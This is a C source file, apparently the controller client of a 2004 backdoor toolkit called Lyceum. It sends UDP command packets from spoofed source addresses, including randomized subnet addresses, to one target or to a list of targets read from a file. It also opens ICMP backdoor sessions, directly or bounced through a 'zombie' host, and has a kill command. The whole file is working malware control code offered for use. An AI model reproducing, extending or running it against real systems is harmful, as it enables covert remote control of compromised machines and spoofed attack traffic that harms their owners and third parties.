
/* 
 * Lyceum-2.46
 *
 * Copyright (c) 2004 phish <phish@hush.com>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in
 *    the
 *    documentation and/or other materials provided with the
 *    distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS
 * IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED
 * TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
 * PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS
 * BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
 * CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF
 * SUCH DAMAGE.
 *
 */




#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <ctype.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "lyceum_client.h"
#include "lyceum_proto.h"
#include "lyceum_comcode.h"

#include "icmp_bd.h"

#ifndef _NO_ENCRYPTION_
#include "key.h"
#endif

struct lyceum_client target;
struct lyceum_filelist dst_list;

int
main (int argc, char *argv[])
{

  char ch;

  int number_to_send = 1;
  int bd_tog = NO_BD;
  int icmp_type = 0;
  unsigned long zombie_host = -1;

  char subnet_temp[32];
  char *opt_str = "d:D:s:S:l:p:P:u:x:i:b:I";


  if (argc < 2)
    usage (NULL);

  client_var_init ();

  while ((ch = getopt (argc, argv, opt_str)) != EOF)
    {
      switch (ch)
	{
	case 'd':
	  {
	    target.dst_ip = inet_addr (optarg);
	    break;
	  }

	case 'D':
	  {
	    dst_list.file_toggle++;
	    dst_list.file_name = optarg;

	    if ((dst_list.list_fp = fopen (dst_list.file_name, "r")) == NULL)
	      {
		perror ("fopen()");
		exit (-1);
	      }

	    if ((fgets
		 (dst_list.current_ip,
		  sizeof (dst_list.current_ip), dst_list.list_fp)) == NULL)
	      {
		printf ("ERROR: no IPs in %s\n", dst_list.file_name);
		fclose (dst_list.list_fp);
		exit (-1);
	      }

	    target.dst_ip = inet_addr (dst_list.current_ip);

	    break;
	  }

	case 's':
	  {
	    target.src_ip = inet_addr (optarg);
	    break;
	  }

	case 'S':
	  {
	    target.subnet_ip = optarg;
	    break;
	  }

	case 'l':
	  {
	    target.local_ip = inet_addr (optarg);
	    break;
	  }

	case 'p':
	  {
	    target.dst_port = atoi (optarg);
	    break;
	  }

	case 'P':
	  {
	    target.src_port = atoi (optarg);
	    break;
	  }

	case 'u':
	  {

	    if ((atoi (optarg)) == LYM_EXIT)
	      {
		if (!(verify_kill ()))
		  exit (0);
	      }

	    snprintf (target.payload, BUFSIZ, "%s:%ld:%s",
		      fuzz (), target.local_ip, optarg);

	    strncat (target.payload, ":", BUFSIZ);

	    break;
	  }

	case 'x':
	  {
	    number_to_send = (atoi (optarg) + 1);
	    break;
	  }

	case 'i':
	  {
	    bd_tog = ICMP_BD;
	    icmp_type = atoi (optarg);
	    break;
	  }

	case 'b':
	  {
	    bd_tog = ICMP_BOUNCE_BD;
	    zombie_host = inet_addr (optarg);
	    break;
	  }

	case 'I':
	  {
	    print_icmp_types ();
	    break;
	  }

	case '?':
	  {
	    exit (-1);
	  }

	}
    }

  if (target.dst_ip == 0)
    {
      printf ("Error: invalid destination IP address\n");
      exit (-1);
    }

  // check if BD needs to be opened
  switch (bd_tog)
    {
    case ICMP_BD:
      {
	icmp_backdoor_connect (target.dst_ip, target.local_ip,
			       target.subnet_ip, target.src_ip, icmp_type);
	exit (0);
      }
    case ICMP_BOUNCE_BD:
      {
	icmp_bounce_backdoor_connect (target.dst_ip, target.local_ip,
				      zombie_host);
	exit (0);
      }
    }

  while (target.dst_ip != 0)
    {
      ch = number_to_send;

      while (ch--)
	{
	  if (target.subnet_ip != NULL)
	    {
	      snprintf (subnet_temp, sizeof (subnet_temp),
			"%s%d", target.subnet_ip, get_random (0, 255));
	      target.src_ip = inet_addr (subnet_temp);
	    }

	  if ((udp_send
	       (target.dst_ip, target.src_ip, target.dst_port,
		target.src_port, target.payload,
		strlen (target.payload))) == -1)
	    {
	      perror ("udp_send()");
	      return -1;
	    }
	}

      parse_lyceum_pkt (target.payload);

      if (packet.com_code == LYM_PING)
	read_lyceum_ping (number_to_send);

      if (dst_list.file_toggle)
	{
	  if ((fgets
	       (dst_list.current_ip, sizeof (dst_list.current_ip),
		dst_list.list_fp)) == NULL)
	    target.dst_ip = 0;
	  else
	    target.dst_ip = inet_addr (dst_list.current_ip);
	}
      else
	target.dst_ip = 0;
    }

  if (dst_list.file_toggle)
    fclose (dst_list.list_fp);

  return 0;

}
